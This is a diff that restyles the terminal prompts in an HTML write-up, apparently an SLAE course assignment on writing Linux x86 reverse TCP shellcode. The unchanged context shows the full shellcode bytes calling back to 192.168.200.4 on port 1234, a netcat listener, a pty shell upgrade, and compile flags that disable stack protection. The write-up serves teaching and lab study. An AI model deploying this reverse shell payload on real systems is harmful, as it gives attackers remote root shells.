@@ -88,7 +88,7 @@ execve
 <p style="text-align:justify;">The steps above providing a footprint to further build the <strong>reverse tcp shellcode</strong>. Moreover, searching the <strong>net.h</strong> header file we can see the defined identifier for the <strong>connect</strong> system call</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae:~/Documents/SLAE/Assignment2# cat /usr/include/linux/net.h | grep SYS_CONNECT
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># cat /usr/include/linux/net.h | grep SYS_CONNECT
 #define SYS_CONNECT 3 /* sys_connect(2) */
 </pre>
 
@@ -116,7 +116,7 @@ int socketcall(int call, unsigned long *args);
 <p style="text-align:justify;">The <strong>call</strong> argument determines which <strong>socket</strong> function to invoke.&nbsp;<strong>args </strong>points to a block containing the actual arguments, which are passed through to the appropriate call. In this case, the <strong>socketcall</strong> system call identifier will be determined first and afterwards the <strong>socket</strong> system calls (socket and connect ) will be called through the <strong>call</strong> instruction in assembly.</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae:~/Documents/SLAE/Assignment2# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>:~/Documents/SLAE/Assignment2</b></span># cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
 #define __NR_socketcall 102
 </pre>
 
@@ -142,7 +142,7 @@ int socket(int domain, int type, int protocol);
 <p style="text-align:justify;">The <strong>domain</strong> argument specifies a communication domain; this selects the protocol family which will be used for communication. At the current architecture, these families are defined in file <strong>/usr/include/i386-linux-gnu/bits/socket.h</strong> as shown below</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae~/Documents/SLAE/Assignment2# cat /usr/include/i386-linux-gnu/bits/socket.h | grep AF_
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># cat /usr/include/i386-linux-gnu/bits/socket.h | grep AF_
 #define AF_UNSPEC PF_UNSPEC
 #define AF_LOCAL PF_LOCAL
 #define AF_UNIX PF_UNIX
@@ -198,7 +198,7 @@ exception of AF_UNIX). */
 <p style="text-align:justify;">Moreover, there are several types of sockets, although stream sockets and datagram sockets are the most commonly used. The types of sockets are also defined inside the file <strong>/usr/include/i386-linux-gnu/bits/socket.h</strong>. The following output shows the assigned values at the stream and datagram sockets accordingly</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae~/Documents/SLAE/Assignment2# cat /usr/include/i386-linux-gnu/bits/socket.h | grep SOCK_
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># cat /usr/include/i386-linux-gnu/bits/socket.h | grep SOCK_
 SOCK_STREAM = 1, /* Sequenced, reliable, connection-based
 #define SOCK_STREAM SOCK_STREAM
 SOCK_DGRAM = 2, /* Connectionless, unreliable datagrams
@@ -239,7 +239,7 @@ mov edi, eax   ; EAX will store the return value of the socket descriptor to edi
 <p style="text-align:justify;">Also, regarding the second argument of the <strong>socketcall</strong> system call, the low order register <strong>bl </strong>of<strong> ebx </strong>register&nbsp;will be assigned with the value <strong>0x1</strong>&nbsp;which indicates the <strong>SYS_SOCKET</strong><strong>&nbsp;</strong>constant as we see below in red</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae~/Documents/SLAE/Assignment2# cat /usr/include/linux/net.h | grep SYS
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># cat /usr/include/linux/net.h | grep SYS
 #define SYS_SOCKET 1 /* sys_socket(2) */
 #define SYS_BIND 2 /* sys_bind(2) */
 #define SYS_CONNECT 3 /* sys_connect(2) */
@@ -315,7 +315,7 @@ print "Port in hex Network Byte order : " , hex(nport)
 the following output of the script above shows the output of the IP 192.168.200.4 and PORT 1234 in network byte order.
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae~/Documents/SLAE/Assignment2# python naddr.py 192.168.200.4 1234
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># python naddr.py 192.168.200.4 1234
 IP in hex Network Byte Order : 0x04c8a8c0
 Port in hex Network Byte order : 0xd204
 </pre>
@@ -380,15 +380,15 @@ int 0x80          ; execute execve syscall
 Now that the code is ready, it is time to test it. The following commands will be used in order to compile and link the code.
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae:~/Documents/SLAE/Assignment2# nasm -f elf32 -o reverse.o reverse.nasm
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># nasm -f elf32 -o reverse.o reverse.nasm
 
-root@slae:~/Documents/SLAE/Assignment2# ld -z execstack -o reverse reverse.o
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># ld -z execstack -o reverse reverse.o
 </pre>
 
 <p style="text-align:justify;">Furthermore, the reverse program runs as follows</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae:~/Documents/SLAE/Assignment2# ./reverse 
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># ./reverse 
 </pre>
 
 <p style="text-align:justify;">In detail, when the reverse program runs, a connection initiates&nbsp;to the target machine that listens to port <strong>1234&nbsp;</strong></p>
@@ -407,10 +407,10 @@ tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ~ nc -nlv 1234
 python -c 'import pty; pty.spawn("/bin/bash")'
-root@slae~/Documents/SLAE/Assignment2# id
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># id
 id
 uid=0(root) gid=0(root) groups=0(root)
-root@slae~/Documents/SLAE/Assignment2# netstat -antp | grep 1234
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># netstat -antp | grep 1234
 netstat -antp | grep 1234
 tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
 </pre>
@@ -419,7 +419,7 @@ tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
 Moreover, in order to create the configurable shellcode, the first thing to do is to use the following command to create the shellcode
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae:~/Documents/SLAE/Assignment2# objdump -d ./reverse|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># objdump -d ./reverse|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 
 "\x31\xc0\xf7\xe2\x52\x89\xd3\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc7\x5b\x68\xc0\xa8\xc8\x04\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xfb\x31\xc9\xb0\x3f\xcd\x80\x41\x66\x83\xf9\x02\x7e\xf5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 </pre>
@@ -490,13 +490,13 @@ ret();
 the following command will be used to compile the program above
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae:~/Documents/SLAE/Assignment2# gcc -fno-stack-protector  -z execstack -m32 -o revshell revshell.c
+r<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># gcc -fno-stack-protector  -z execstack -m32 -o revshell revshell.c
 </pre>
 
 Furthermore, as seen below when the <strong>revshell</strong> program runs, then if a target machine listens to specific port&nbsp; ( e.g <strong>1234</strong> using a listener ) , then a new connection starts on the target machine.
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-root@slae:~/Documents/SLAE/Assignment2# ./revshell 192.168.200.4 1234
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># ./revshell 192.168.200.4 1234
 Shellcode Length: 84
 </pre>
 
@@ -517,7 +517,7 @@ Furthermore, after the successful connection to the target machine, we will use 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ~ nc -nlv 1234 
 python -c 'import pty; pty.spawn("/bin/bash")' 
-root@slae:~/Documents/SLAE/Assignment2# id
+<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># id
 id
 uid=0(root) gid=0(root) groups=0(root) 
 root@slae:~/Documents/SLAE/Assignment2# netstat -antp | grep 1234
